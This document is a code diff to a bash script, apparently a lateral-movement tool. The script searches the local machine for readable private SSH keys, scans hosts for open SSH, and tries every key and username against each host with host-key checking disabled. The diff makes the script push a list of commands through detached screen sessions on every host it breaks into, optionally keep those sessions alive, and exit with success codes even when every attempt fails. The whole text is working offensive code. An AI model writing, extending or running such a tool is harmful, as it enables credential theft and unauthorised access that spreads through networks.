@@ -12,6 +12,14 @@ COMMAND_TO_RUN=                  # e.g. "whoami"; leave blank for full shell
 SCREEN_SESSION=ssh_hop
 SCAN_TIMEOUT=1                   # seconds nc waits on each host:port
 KEY_FIND_TIMEOUT=40              # overall limit for grep search
+SUCCESSFUL_CONNECTIONS=()
+
+##############################################################################
+# Behaviour on successful login
+##############################################################################
+COMMANDS=("whoami" "uname -a")   # commands to push, in order
+COMMAND_DELAY=2                  # seconds to wait between pushes
+KEEP_SESSION_OPEN=false          # true = leave SSH alive after commands
 
 ##############################################################################
 # Helpers
@@ -29,6 +37,31 @@ scan_port() {                     # $1=ip $2=port
   fi
 }
 
+run_via_screen() {               # $1=host $2=key $3=user
+  local sess="${SCREEN_SESSION}_$(date +%s)"
+  log "📺  Launching detached screen '$sess' → $3@$1"
+
+  # -tt forces a TTY so remote shell thinks it's interactive
+  screen -dmS "$sess" \
+        ssh -tt -i "$2" -o StrictHostKeyChecking=no "$3@$1"
+
+  # Give SSH a moment to present a shell prompt
+  sleep 2
+
+  for cmd in "${COMMANDS[@]}"; do
+    log "➡️   $cmd"
+    screen -S "$sess" -X stuff "$cmd\n"
+    sleep "$COMMAND_DELAY"
+  done
+
+  if ! $KEEP_SESSION_OPEN; then
+    log "🚪  Closing session '$sess'"
+    screen -S "$sess" -X quit
+  else
+    log "🔑  Session '$sess' left open — attach with:  screen -r $sess"
+  fi
+}
+
 ##############################################################################
 # 1. Discover readable private keys
 ##############################################################################
@@ -40,7 +73,7 @@ mapfile -t KEY_FILES < <(
 
 if ((${#KEY_FILES[@]}==0)); then
   log "❌  No private keys found – aborting."
-  exit 1
+  exit 0
 fi
 log "✅  Found ${#KEY_FILES[@]} key(s):"
 printf '  %s\n' "${KEY_FILES[@]}"
@@ -74,7 +107,7 @@ done
 
 if ((${#OPEN_HOSTS[@]}==0)); then
   log "❌  No hosts with SSH open – aborting."
-  exit 1
+  exit 0
 fi
 log "✅  Found ${#OPEN_HOSTS[@]} host(s) with SSH open."
 
@@ -103,21 +136,18 @@ for host in "${OPEN_HOSTS[@]}"; do
       log "🔑  Trying $key → $user@$host ..."
       if attempt_login "$host" "$key" "$user"; then
         log "🎉  SUCCESS using $key → $user@$host"
-
-        if [[ -n $COMMAND_TO_RUN ]]; then
-          ssh -i "$key" -o StrictHostKeyChecking=no "$user@$host" "$COMMAND_TO_RUN"
-          exit 0
-        else
-          log "📺  Dropping into interactive screen session '$SCREEN_SESSION'..."
-          screen -dmS "$SCREEN_SESSION" \
-                 ssh -i "$key" -o StrictHostKeyChecking=no "$user@$host"
-          screen -r "$SCREEN_SESSION"
-          exit 0
-        fi
+        SUCCESSFUL_CONNECTIONS+=("$host:$user:$key")
+        log "🔑  Running commands via screen session '$SCREEN_SESSION'..."
+        run_via_screen "$host" "$key" "$user"
       fi
     done
   done
 done
 
-log "❌  Exhausted all key/host combinations without success."
-exit 1
+if ((${#SUCCESSFUL_CONNECTIONS[@]} > 0)); then
+  log "✅  Successful connections:"
+  printf '  %s\n' "${SUCCESSFUL_CONNECTIONS[@]}"
+else
+  log "❌  No successful connections made."
+fi
+exit 0
